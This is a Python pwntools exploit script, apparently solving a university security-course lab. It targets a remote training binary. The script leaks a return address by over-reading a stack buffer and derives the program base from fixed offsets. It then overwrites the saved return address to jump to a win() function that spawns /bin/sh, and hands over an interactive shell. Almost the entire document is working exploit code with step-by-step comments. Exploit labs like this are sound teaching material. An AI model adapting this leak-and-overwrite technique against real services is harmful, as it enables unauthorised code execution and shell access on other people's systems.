#!/usr/bin/python3
# 2022.09.27.1803.EST
from pwn import *

#with gdb.debug("./lab5-1.bin") as p:
with remote("csc748.hostbin.org", 7051) as p:
    ping = p.recv()    # First 'PING' message

    # Now we find our leak by exploiting if (read(0, buff, 61) <= 1)
    # We send 16 bytes to get to the end of buffer[16] then 8 more bytes to bypass EBP
    # Finally we read the next 6 bytes (as userspace will not interfere with kernelspace) and append two bytes to make it a full 8 bytes
    p.send(b"A"*16 + b"B"*7 + b"\n")
    p.readuntil(b"BBBB\n")
    main_run_addr = p.read(6) + b"\x00\x00"
    main_run_addr = u64(main_run_addr)

    offset = 0x1c    # 0x1c happens to be the offset from main's run() to main() itself
    main_addr = main_run_addr - offset

    offset = 0x13ab    # 0x13ab happens to be the offset from main() to the program base
    base_addr = main_addr - offset

    pong = p.recv()    # Now that we have our leak we can inject our payload, we just need to recv our PONG to continue execution

    win_addr = base_addr + 0x1269    # 0x1269 happens to be the offset to win() from the program base itself

    # To account for the inner loop's stack variables we must send 0x18 bytes to write directly to where the new RBP will appear after break
    payload = b"C"*0x18 + p64(win_addr)
    p.send(payload)

    ping = p.recv()

    p.send(b"\n")    # We can break the inner loop by sending a single character
    # We now have shell via win()'s execl("/bin/sh", "/bin/sh", NULL);
    p.interactive()
